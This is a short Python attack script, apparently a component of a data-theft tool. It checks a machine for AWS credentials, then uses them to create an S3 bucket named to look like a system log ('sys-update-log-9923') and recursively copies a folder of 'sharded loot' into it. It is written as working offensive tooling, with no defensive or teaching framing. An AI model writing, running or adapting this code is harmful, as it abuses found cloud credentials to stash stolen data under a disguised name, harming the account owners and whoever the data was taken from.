import subprocess
import os

def find_and_park():
    # Check for AWS credentials
    if os.path.exists(os.path.expanduser("~/.aws/credentials")):
        print("[*] [PARK] AWS Credentials found. Creating ghost bucket...")
        # Command to create a hidden, randomly named bucket
        # and move sharded loot there.
        subprocess.run(["aws", "s3", "mb", "s3://sys-update-log-9923"])
        subprocess.run(["aws", "s3", "cp", "./shards/", "s3://sys-update-log-9923/", "--recursive"])
        print("[+] [PARK] Loot parked in target S3. Path: s3://sys-update-log-9923/")

if __name__ == "__main__":
    find_and_park()
